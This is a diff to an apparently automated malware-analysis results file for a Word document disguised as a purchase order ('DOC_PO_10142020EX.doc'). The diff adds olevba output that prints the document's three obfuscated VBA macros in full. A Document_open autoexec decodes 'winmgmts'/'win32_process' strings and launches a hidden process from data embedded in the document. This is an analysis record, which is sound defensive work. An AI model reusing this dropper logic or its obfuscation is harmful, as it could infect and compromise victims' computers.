@@ -1,9 +1,51 @@
 {
   "form": 1,
   "observables": {
+    "file:2d1d34431d35c697234e0009ef7fa659d680a80a477858fd9ee45312d0a7faa3": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "DOC_PO_10142020EX.doc.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:3d437dd761fe4f9ff78f13f6336862842b0528c1081680055029bcfb2ce5647a",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
     "file:3d437dd761fe4f9ff78f13f6336862842b0528c1081680055029bcfb2ce5647a": {
       "detections": {},
-      "directives": {},
+      "directives": {
+        "sandbox": true
+      },
       "excluded_analysis": {},
       "paths": {
         "DOC_PO_10142020EX.doc": {
@@ -30,12 +72,128 @@
           },
           "summary": "File Type Analysis: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.2, Code page: 1252, Title: Iure., Author: Adrien Perrot, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word, Create Time/Date: Wed Oct 14 12:13:00 2020, Last Saved Time/Date: Wed Oct 14 12:14:00 2020, Number of Pages: 1, Number of Words: 1544, Number of Characters: 8807, Security: 8 (application/msword) (ms office document) (ole compound file) (zip archive)",
           "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "hex string": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "<root>/files/DOC_PO_10142020EX.doc",
+                "local_path": "2d1d34431d35c697234e0009ef7fa659d680a80a477858fd9ee45312d0a7faa3",
+                "stream_path": "Yan8boy3v12dg",
+                "vba_code": "Function Vcvndetfvb9o5om_t7()\nOn Error Resume Next\n   Dim LmeWbBPt()\nReDim LmeWbBPt(1)\nLmeWbBPt(0) = 121 + 33\nDim MUFjECAJc()\nReDim MUFjECAJc(3)\nMUFjECAJc(0) = 447 + 61721\nMUFjECAJc(1) = 2447 + 71\nMUFjECAJc(2) = 962 + 98\nDim FBHKJp()\nReDim FBHKJp(1)\nFBHKJp(0) = 1 + 8868\nF3h8qb8achk = Zjzofc3i1oqw7ied2o + \"=EGRro=EGR=EGRce=EGRs=EGRs=EGR\" + Dnm3qqtxzvkxy1r\n   Dim VnagHGA()\nReDim VnagHGA(1)\nVnagHGA(0) = 67 + 8\nDim ZuWDyCBDH()\nReDim ZuWDyCBDH(1)\nZuWDyCBDH(0) = 7152 + 7\nDim yjrTGcAi()\nReDim yjrTGcAi(2)\nyjrTGcAi(0) = 2482 + 91\nyjrTGcAi(1) = 9952 + 661\nCrenm6xm7lp = O6bkyay5zhiqea301 + \"=EGR=EGR:=EGRw=EGRin=EGR=EGR3=EGR2=EGR_=EGR\" + Duysj9wqcxp337oouj\n   Dim xLNxea()\nReDim xLNxea(2)\nxLNxea(0) = 2 + 11\nxLNxea(1) = 6 + 141\nDim PzeHEg()\nReDim PzeHEg(1)\nPzeHEg(0) = 7 + 1\nDim TJCPcU()\nReDim TJCPcU(1)\nTJCPcU(0) = 847 + 7\nFf50e_073_ah = C0eztciidtz5l83v + \"=EGR=EGRw=EGRi=EGRnm=EGR=EGRgm=EGRt=EGR=EGR\" + Ecveyi9ao9pmb1qskw\n   Dim TeKSHB()\nReDim TeKSHB(3)\nTeKSHB(0) = 8739 + 51\nTeKSHB(1) = 8216 + 41\nTeKSHB(2) = 4 + 340\nDim kXVzwFJD()\nReDim kXVzwFJD(3)\nkXVzwFJD(0) = 1562 + 5471\nkXVzwFJD(1) = 24 + 671\nkXVzwFJD(2) = 67 + 5\nDim ajmOCMyHz()\nReDim ajmOCMyHz(1)\najmOCMyHz(0) = 8576 + 91\nAewxxnsd0uuy = Yan8boy3v12dg.Ecfl82njta9izze0k.Pages(1).Caption\n   Dim ykuQgu()\nReDim ykuQgu(1)\nykuQgu(0) = 2376 + 23\nDim EDGPxH()\nReDim EDGPxH(2)\nEDGPxH(0) = 8 + 94021\nEDGPxH(1) = 3 + 8\nDim DqMVZM()\nReDim DqMVZM(1)\nDqMVZM(0) = 1 + 615\nRs8x_d_hqsq = Ff50e_073_ah + Aewxxnsd0uuy + Crenm6xm7lp + Yan8boy3v12dg.Nd153hgzzyl + F3h8qb8achk\n   Dim PEywNDAhG()\nReDim PEywNDAhG(1)\nPEywNDAhG(0) = 23 + 5024\nDim tJpgBLgD()\nReDim tJpgBLgD(3)\ntJpgBLgD(0) = 6 + 8031\ntJpgBLgD(1) = 92 + 91\ntJpgBLgD(2) = 6 + 3\nDim eFZACDid()\nReDim eFZACDid(1)\neFZACDid(0) = 38 + 42\nRgjyzurqu1uo2z = Xv0vyd2sf51_(Rs8x_d_hqsq)\n   Dim dJKJvfCS()\nReDim dJKJvfCS(2)\ndJKJvfCS(0) = 846 + 541\ndJKJvfCS(1) = 95 + 8\nDim ojfeG()\nReDim ojfeG(3)\nojfeG(0) = 2915 + 84371\nojfeG(1) = 338 + 4041\nojfeG(2) = 1 + 7\nDim wxkBIFJ()\nReDim wxkBIFJ(2)\nwxkBIFJ(0) = 4 + 351\nwxkBIFJ(1) = 5 + 7295\nSet K3uw83mdaippp = CreateObject(Rgjyzurqu1uo2z)\n   Dim TYdnU()\nReDim TYdnU(1)\nTYdnU(0) = 7 + 5650\nDim nkRVGN()\nReDim nkRVGN(2)\nnkRVGN(0) = 9 + 241\nnkRVGN(1) = 9 + 2\nDim RlnSiCCH()\nReDim RlnSiCCH(1)\nRlnSiCCH(0) = 3 + 723\nRj6qh6_3ibbt10s = A6fqa1s9o5e6_ksisy + Rgjyzurqu1uo2z + Aewxxnsd0uuy + Yan8boy3v12dg.Ldtczgj7dy38 + Yan8boy3v12dg.G5co65n6t1b\n   Dim AJUaeDgx()\nReDim AJUaeDgx(3)\nAJUaeDgx(0) = 28 + 41\nAJUaeDgx(1) = 6 + 91\nAJUaeDgx(2) = 5 + 746\nDim lliBHo()\nReDim lliBHo(1)\nlliBHo(0) = 7 + 8\nDim xmyrgAH()\nReDim xmyrgAH(2)\nxmyrgAH(0) = 6 + 331\nxmyrgAH(1) = 6 + 66\nSet Yc8pfho4owwvbo = Wzf8v4li4f1p(Rj6qh6_3ibbt10s + Yan8boy3v12dg.Nd153hgzzyl)\n   Dim uaCtFtHG()\nReDim uaCtFtHG(3)\nuaCtFtHG(0) = 31 + 8851\nuaCtFtHG(1) = 8864 + 81\nuaCtFtHG(2) = 3 + 9\nDim vSRgfqAD()\nReDim vSRgfqAD(2)\nvSRgfqAD(0) = 41 + 41\nvSRgfqAD(1) = 83 + 2\nDim EuDBGBk()\nReDim EuDBGBk(2)\nEuDBGBk(0) = 793 + 49481\nEuDBGBk(1) = 91 + 12\nO88imaydvdpuf = Mid(CVar(Vufp3qemgme18z3.Sections(1)), 5, Len(CVar(Vufp3qemgme18z3.Sections(1))))\n   Dim XdBdCrIp()\nReDim XdBdCrIp(1)\nXdBdCrIp(0) = 133 + 7\nDim dJhsz()\nReDim dJhsz(3)\ndJhsz(0) = 1549 + 61\ndJhsz(1) = 2 + 61091\ndJhsz(2) = 2 + 98\nDim cwBIUY()\nReDim cwBIUY(2)\ncwBIUY(0) = 4078 + 51\ncwBIUY(1) = 5 + 4\n   Dim KINqDHC()\nReDim KINqDHC(2)\nKINqDHC(0) = 5 + 31\nKINqDHC(1) = 7 + 76\nDim btTtBFXJR()\nReDim btTtBFXJR(3)\nbtTtBFXJR(0) = 789 + 55781\nbtTtBFXJR(1) = 510 + 511\nbtTtBFXJR(2) = 1 + 1681\nDim kHBkBjG()\nReDim kHBkBjG(1)\nkHBkBjG(0) = 246 + 17\nK3uw83mdaippp.Create Xv0vyd2sf51_(O88imaydvdpuf), L2gzfe47c5ilbl6, Yc8pfho4owwvbo\n   Dim uVdKP()\nReDim uVdKP(3)\nuVdKP(0) = 26 + 81\nuVdKP(1) = 9587 + 6321\nuVdKP(2) = 4 + 2\nDim wEbSgj()\nReDim wEbSgj(1)\nwEbSgj(0) = 8 + 64\nDim rNYrI()\nReDim rNYrI(3)\nrNYrI(0) = 2224 + 2771\nrNYrI(1) = 8139 + 21\nrNYrI(2) = 8 + 1763\n   Dim iTPaCCXa()\nReDim iTPaCCXa(1)\niTPaCCXa(0) = 29 + 2588\nDim dMvIIGa()\nReDim dMvIIGa(3)\ndMvIIGa(0) = 598 + 73461\ndMvIIGa(1) = 113 + 2431\ndMvIIGa(2) = 8179 + 8001\nDim KBsbEEEJH()\nReDim KBsbEEEJH(2)\nKBsbEEEJH(0) = 50 + 721\nKBsbEEEJH(1) = 87 + 30\nEnd Function\nFunction Wzf8v4li4f1p(Liub2ctn9v65p)\nOn Error Resume Next\n   Dim dYHoHuCC()\nReDim dYHoHuCC(3)\ndYHoHuCC(0) = 97 + 41\ndYHoHuCC(1) = 299 + 31\ndYHoHuCC(2) = 29 + 65\nDim pFRldJ()\nReDim pFRldJ(2)\npFRldJ(0) = 9 + 4341\npFRldJ(1) = 6 + 2022\nDim FNdHxClT()\nReDim FNdHxClT(2)\nFNdHxClT(0) = 6116 + 8961\nFNdHxClT(1) = 1 + 7\nSet Wzf8v4li4f1p = D6imzn9bmimax3kt20.Teiyhq24_avenkgn(Bbxvpflugjdqbus + Liub2ctn9v65p + V1fh5gali6qefsctf1)\n   Dim qZPYBYyGr()\nReDim qZPYBYyGr(2)\nqZPYBYyGr(0) = 1 + 51\nqZPYBYyGr(1) = 71 + 2\nDim gdOZr()\nReDim gdOZr(3)\ngdOZr(0) = 2 + 55781\ngdOZr(1) = 9349 + 3931\ngdOZr(2) = 9 + 9\nDim OKmql()\nReDim OKmql(2)\nOKmql(0) = 3 + 85711\nOKmql(1) = 51 + 5\nWzf8v4li4f1p. _\nshowwindow = E7dflpws7an5tl + Mmfy37blnu1hp + Fvkmdld2u63hyfk6 + X46b2os0ufu + Pwih5yqcrpah13l7 + F8bst4ovxrh4otg\n   Dim poJeJ()\nReDim poJeJ(1)\npoJeJ(0) = 5 + 84\nDim WNCKLBGTA()\nReDim WNCKLBGTA(3)\nWNCKLBGTA(0) = 42 + 91\nWNCKLBGTA(1) = 7 + 81\nWNCKLBGTA(2) = 89 + 8245\nDim UYmdwf()\nReDim UYmdwf(2)\nUYmdwf(0) = 1 + 68981\nUYmdwf(1) = 87 + 2197\nEnd Function\nFunction Xv0vyd2sf51_(Ci2y0xdkrp3)\nOn Error Resume Next\n   Dim tiYjiUJA()\nReDim tiYjiUJA(3)\ntiYjiUJA(0) = 496 + 31\ntiYjiUJA(1) = 69 + 86431\ntiYjiUJA(2) = 16 + 3\nDim vStWB()\nReDim vStWB(2)\nvStWB(0) = 308 + 661\nvStWB(1) = 7612 + 5494\nDim RqGKBS()\nReDim RqGKBS(1)\nRqGKBS(0) = 62 + 6400\nFrzi7oablo8dl = (Ci2y0xdkrp3)\n   Dim GoxQJS()\nReDim GoxQJS(1)\nGoxQJS(0) = 96 + 73\nDim iyAsZm()\nReDim iyAsZm(1)\niyAsZm(0) = 6133 + 641\nDim LrTlGg()\nReDim LrTlGg(1)\nLrTlGg(0) = 6 + 15\nH9smmtoti2ni59ekc = D6imzn9bmimax3kt20.B_07fq6mu4p_llg_(Frzi7oablo8dl)\n   Dim LoCXWBFCg()\nReDim LoCXWBFCg(1)\nLoCXWBFCg(0) = 9168 + 929\nDim BKOIC()\nReDim BKOIC(2)\nBKOIC(0) = 4979 + 61\nBKOIC(1) = 20 + 3\nDim gPghIH()\nReDim gPghIH(2)\ngPghIH(0) = 1 + 121\ngPghIH(1) = 4 + 19\nInf81vi0x59q = D6imzn9bmimax3kt20.Whtwp7xms6w91ckbsc(H9smmtoti2ni59ekc)\n   Dim tODlBiJ()\nReDim tODlBiJ(3)\ntODlBiJ(0) = 6 + 91\ntODlBiJ(1) = 4 + 51\ntODlBiJ(2) = 4 + 1515\nDim wbMVSzFj()\nReDim wbMVSzFj(2)\nwbMVSzFj(0) = 2 + 11\nwbMVSzFj(1) = 2940 + 64\nDim sjrXHIHGF()\nReDim sjrXHIHGF(3)\nsjrXHIHGF(0) = 3 + 71\nsjrXHIHGF(1) = 599 + 81\nsjrXHIHGF(2) = 619 + 5\nXv0vyd2sf51_ = Inf81vi0x59q\n   Dim UKMgmDpD()\nReDim UKMgmDpD(2)\nUKMgmDpD(0) = 6 + 131\nUKMgmDpD(1) = 50 + 757\nDim OPirHE()\nReDim OPirHE(3)\nOPirHE(0) = 4 + 41\nOPirHE(1) = 9 + 281\nOPirHE(2) = 5 + 8\nDim dDYTBiY()\nReDim dDYTBiY(3)\ndDYTBiY(0) = 9 + 41\ndDYTBiY(1) = 721 + 91\ndDYTBiY(2) = 6 + 7343\nEnd Function\n",
+                "vba_filename": "Yan8boy3v12dg"
+              },
+              {
+                "file_name": "<root>/files/DOC_PO_10142020EX.doc",
+                "local_path": "e40f4b18c971fecbfaea2d8c0e1f05991157d8bd9a5d5ba029dab692d72ae271",
+                "stream_path": "Vufp3qemgme18z3",
+                "vba_code": "Private Sub Document_open()\nYan8boy3v12dg.Vcvndetfvb9o5om_t7\nEnd Sub",
+                "vba_filename": "Vufp3qemgme18z3"
+              },
+              {
+                "file_name": "<root>/files/DOC_PO_10142020EX.doc",
+                "local_path": "518c943fc7ba418f73b195e7f71d437f2298be71ab8e41be74e924963e754cc2",
+                "stream_path": "D6imzn9bmimax3kt20",
+                "vba_code": "Function Whtwp7xms6w91ckbsc(Rj6qh6_3ibbt10s)\nOn Error Resume Next\n   Dim kSCPGIE()\nReDim kSCPGIE(3)\nkSCPGIE(0) = 98 + 2041\nkSCPGIE(1) = 6 + 651\nkSCPGIE(2) = 924 + 91\nDim IuAbyF()\nReDim IuAbyF(3)\nIuAbyF(0) = 3398 + 6291\nIuAbyF(1) = 5521 + 411\nIuAbyF(2) = 74 + 382\nDim hispND()\nReDim hispND(1)\nhispND(0) = 4 + 44\nWhtwp7xms6w91ckbsc = Join(Rj6qh6_3ibbt10s, Smmurzr5040hfs857)\n   Dim vorJLZB()\nReDim vorJLZB(1)\nvorJLZB(0) = 1 + 91\nDim jZqsnEB()\nReDim jZqsnEB(3)\njZqsnEB(0) = 562 + 17351\njZqsnEB(1) = 5 + 11\njZqsnEB(2) = 4 + 5\nDim BxjOFl()\nReDim BxjOFl(3)\nBxjOFl(0) = 5 + 31\nBxjOFl(1) = 4 + 51\nBxjOFl(2) = 899 + 3\nEnd Function\nFunction Teiyhq24_avenkgn(X__89hzmpt__j98x)\nOn Error Resume Next\n   Dim QSehIDJk()\nReDim QSehIDJk(3)\nQSehIDJk(0) = 6 + 621\nQSehIDJk(1) = 8 + 521\nQSehIDJk(2) = 2 + 637\nDim OmpAAGdY()\nReDim OmpAAGdY(2)\nOmpAAGdY(0) = 6 + 621\nOmpAAGdY(1) = 4 + 2\nDim rifawQJTB()\nReDim rifawQJTB(2)\nrifawQJTB(0) = 57 + 21\nrifawQJTB(1) = 3 + 429\nSet Teiyhq24_avenkgn = CreateObject(X__89hzmpt__j98x)\n   Dim IXKboNCD()\nReDim IXKboNCD(3)\nIXKboNCD(0) = 6 + 13341\nIXKboNCD(1) = 178 + 71\nIXKboNCD(2) = 77 + 5\nDim iVEtCnF()\nReDim iVEtCnF(3)\niVEtCnF(0) = 861 + 401\niVEtCnF(1) = 406 + 9871\niVEtCnF(2) = 10 + 63\nDim mBnZB()\nReDim mBnZB(2)\nmBnZB(0) = 1 + 31\nmBnZB(1) = 9768 + 1610\nEnd Function\nFunction B_07fq6mu4p_llg_(Ff50e_073_ah)\nOn Error Resume Next\n   Dim YMWHcI()\nReDim YMWHcI(1)\nYMWHcI(0) = 4 + 2\nDim fNvEFTF()\nReDim fNvEFTF(3)\nfNvEFTF(0) = 9 + 4431\nfNvEFTF(1) = 257 + 651\nfNvEFTF(2) = 6 + 7\nDim WlLRx()\nReDim WlLRx(2)\nWlLRx(0) = 185 + 24761\nWlLRx(1) = 743 + 353\nB_07fq6mu4p_llg_ = Split(Ff50e_073_ah, \"=EGR\")\n   Dim BJtSGqAsH()\nReDim BJtSGqAsH(2)\nBJtSGqAsH(0) = 4 + 21\nBJtSGqAsH(1) = 53 + 2\nDim pgsTqF()\nReDim pgsTqF(3)\npgsTqF(0) = 58 + 31\npgsTqF(1) = 576 + 611\npgsTqF(2) = 14 + 3\nDim rqukFFIC()\nReDim rqukFFIC(3)\nrqukFFIC(0) = 72 + 491\nrqukFFIC(1) = 143 + 811\nrqukFFIC(2) = 1 + 3\nEnd Function",
+                "vba_filename": "D6imzn9bmimax3kt20"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (3 macro files) (OLE) | autoexec=1, suspicious=1, hex string=1",
+          "tags": {}
         }
       },
       "tags": {
         "microsoft_office": true,
         "ole": true,
+        "olevba": true,
         "zip": true
+      }
+    },
+    "file:518c943fc7ba418f73b195e7f71d437f2298be71ab8e41be74e924963e754cc2": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "DOC_PO_10142020EX.doc.olevba/macro_2.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:3d437dd761fe4f9ff78f13f6336862842b0528c1081680055029bcfb2ce5647a",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:e40f4b18c971fecbfaea2d8c0e1f05991157d8bd9a5d5ba029dab692d72ae271": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "DOC_PO_10142020EX.doc.olevba/macro_1.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:3d437dd761fe4f9ff78f13f6336862842b0528c1081680055029bcfb2ce5647a",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
       }
     }
   }
